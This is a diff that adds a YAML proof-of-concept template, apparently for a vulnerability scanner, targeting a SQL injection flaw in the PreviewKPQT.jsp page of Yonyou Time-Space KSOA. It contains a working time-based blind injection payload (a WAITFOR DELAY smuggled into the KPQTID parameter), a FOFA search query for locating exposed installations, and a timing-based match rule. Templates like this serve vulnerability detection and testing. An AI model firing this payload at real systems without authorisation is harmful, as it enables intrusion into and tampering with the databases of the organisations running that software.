@@ -1,0 +1,27 @@
+id: poc-yaml-yongyou-ksoa-previewkpqt-sqli
+info:
+  name: 用友时空KSOA PreviewKPQT SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+  fofa: app="用友-时空KSOA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+  t3: gbk_encode("问卷预览")
+requests:
+- method: GET
+  path: /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(body,"XXXX-XX-XX") &&
+
+    contains(body,t3) &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
